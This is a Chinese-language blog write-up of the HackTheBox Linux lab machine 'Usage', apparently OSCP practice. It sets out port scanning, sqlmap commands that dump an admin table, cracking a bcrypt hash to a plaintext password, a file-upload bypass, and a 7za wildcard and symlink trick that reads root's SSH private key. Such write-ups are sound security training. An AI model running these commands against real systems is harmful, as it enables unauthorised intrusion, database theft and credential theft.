---
title: "Usage"
description: "这篇HackTheBox Linux 靶机 Usage 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Usage 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-09-22T16:10:38+08:00"
publishDate: "2024-09-22T16:10:38+08:00"
lastmod: "2024-09-22T16:10:38+08:00"
url: "/hackthebox/linux/usage/"
image: "images/oscp-banners/banner-008.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对服务器的TCP及UDP端口进行探测

```
sudo nmap -p- 10.10.11.18 -open
sudo nmap -sU -p- --min-rate 10000 --open 10.10.11.18
```

![image-20240922141657211](https://s2.loli.net/2024/09/22/7nTYdu8Z9CAeEH5.png)

对服务开放端口进行检查

```
sudo nmap -p22,80 -A 10.10.11.18 -oX Usage.xml
```

![image-20240922141904287](https://s2.loli.net/2024/09/22/jBOwdNeI1bRvyV7.png)

80端口进行进一步探测工作 ，根据检查内容，优先添加两条hosts

usage.htb

admin.usage.htb

![image-20240922142342960](https://s2.loli.net/2024/09/22/xumfdQXgSERoGjr.png)

![image-20240922142354375](https://s2.loli.net/2024/09/22/ZMD3GvKWry9tHeq.png)

同时在usage.htb页面存在一个注册页面，可以通过简单注册后进行登录

对两个域名进行路径扫描，没有发现特别有价值的内容，例如robots.txt等内容均没有实际新的内容

尝试进行sql注入，但失败

```
admin
'1 or 1=2-- 
```

尝试查找页面源码

![image-20240922143909517](https://s2.loli.net/2024/09/22/wMX8reNVKRUvqA7.png)

看到几个关键字

laravel-admin

adminlte

但也没有发现，继续回到原先的目录中，发现在reset目录输入邮箱如果输入‘会出现服务器报错，所以考虑这个点存在sql注入，但是盲注，需要使用sqlmap

```
sqlmap -r burp.req -p email --dbms=mysql --risk 3 --level 3 --technique=UT --dbs
```

![image-20240922150256746](https://s2.loli.net/2024/09/22/jY451mFsG8ZpPRo.png)

```
sqlmap -r burp.req -p email --risk 3 --level 5 -D usage_blog --tables --random-agent
```



```
sqlmap -r burp.req -p email --risk 3 --level 5 -D usage_blog -T admin_users -C username,password --random-agent --dump --threads 10
```



最终获取到一个admin的账号密码

pass：$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

发现密码为whatever1

![image-20240922150435630](https://s2.loli.net/2024/09/22/QLPsuCFZp6grSKB.png)

![image-20240922150848587](https://s2.loli.net/2024/09/22/B5SG38FVspr7qNz.png)

成功登录，找寻上传点，版本等内容

经过检查laravel-admin1.8.18应当存在任意文件上传的漏洞，在setting页面可以上传图片，考虑可以进行文件绕过

直接上传会提示只允许图片文件

![image-20240922151749712](https://s2.loli.net/2024/09/22/56MdEQ1xBhuFabC.png)

判断其是前端校验，后端无校验

![image-20240922153124341](https://s2.loli.net/2024/09/22/Q3FCh7HRK6qYjrx.png)

![image-20240922151940518](https://s2.loli.net/2024/09/22/D48WV6whd37OXUa.png)

提示上传成功，在下载按钮点击copy url进行点击打开

![image-20240922153201407](https://s2.loli.net/2024/09/22/dbc9Yhlt3BM6zX4.png)

成功突破边界

![image-20240922153348286](https://s2.loli.net/2024/09/22/vkMHWqsSfXALEja.png)

在home目录下找到一个文件中存在账号密码

![image-20240922154802676](https://s2.loli.net/2024/09/22/FO2M78kbiBpUewy.png)

尝试su到另外一个用户，发现成功

![image-20240922154821415](https://s2.loli.net/2024/09/22/x16wqJMvRmENX3U.png)

运行sudo -l

![image-20240922154854016](https://s2.loli.net/2024/09/22/nH5paAOy3deGZt9.png)

![image-20240922155008359](https://s2.loli.net/2024/09/22/W3fpSC7ZqBNtQFV.png)

使用strings对文件的实际执行内容进行查看

![image-20240922155714629](https://s2.loli.net/2024/09/22/w6yil1ncMYCpz27.png)

关注下7za这个命令，通过网络的信息查找，发现这个带有通配的语句可能存在任意文件读取的问题

（https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------）

```
cd /var/www/html/
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa

```

![image-20240922160611026](https://s2.loli.net/2024/09/22/UrMcnwviRpzgb3T.png)

![image-20240922160621672](https://s2.loli.net/2024/09/22/kcEKsVIUroSnAO9.png)

应当已获取root的id_rsa文件，进行复制

![image-20240922160937627](https://s2.loli.net/2024/09/22/zJrMkXdsvU4QT6f.png)

![image-20240922160911404](https://s2.loli.net/2024/09/22/tzfUhaHQMNg4mvw.png)

